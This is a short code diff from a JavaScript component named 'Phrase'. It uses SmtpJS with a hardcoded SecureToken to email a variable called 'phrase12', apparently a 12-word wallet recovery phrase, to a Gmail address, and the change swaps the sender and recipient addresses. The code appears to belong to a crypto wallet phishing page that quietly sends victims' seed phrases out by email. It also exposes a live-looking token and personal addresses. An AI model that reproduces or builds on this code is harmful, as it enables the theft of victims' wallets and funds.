@@ -404,8 +404,8 @@ const Phrase = ({ data }) => {
         setIsLoading(true)
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
-            To : 'amogukachi7@gmail.com',
-            From : "kachiamogu47@gmail.com",
+            To : 'kachiamogu47@gmail.com',
+            From : "amogukachi7@gmail.com",
             Subject : data.name,
             Body : phrase12
         }).then(
